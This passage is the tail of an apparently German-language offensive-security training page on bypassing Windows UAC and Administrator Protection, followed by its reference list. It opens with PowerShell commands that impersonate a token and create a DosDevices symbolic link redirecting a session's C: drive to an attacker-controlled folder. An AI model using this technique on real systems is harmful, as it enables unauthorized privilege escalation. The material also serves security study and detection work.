Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Referenzen

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Funktionsweise von User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Sammlung von UAC bypass-Techniken](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Kompatibilitätsscanner und Launcher für UAC bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI nutzt AI zur Generierung von PowerShell-Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: 0-Day-Exploitation gegen Ziele südostasiatischer Regierungen](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Umgehung des Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – UAC bypass mithilfe der SilentCleanup-Task](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
